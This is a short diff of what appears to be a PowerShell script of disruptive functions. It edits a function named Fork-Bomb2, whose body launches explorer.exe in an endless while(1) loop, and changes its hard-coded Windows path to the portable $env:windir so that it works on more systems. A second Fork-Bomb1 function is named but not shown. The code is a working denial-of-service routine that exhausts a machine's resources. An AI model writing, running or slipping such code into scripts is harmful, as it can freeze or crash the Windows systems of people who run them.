@@ -1145,7 +1145,7 @@ Param(
 
 Function Fork-Bomb2 
 {
-    while(1) {C:\Windows\explorer.exe}
+    while(1) {$env:windir\explorer.exe}
 }
 
 Function Fork-Bomb1 
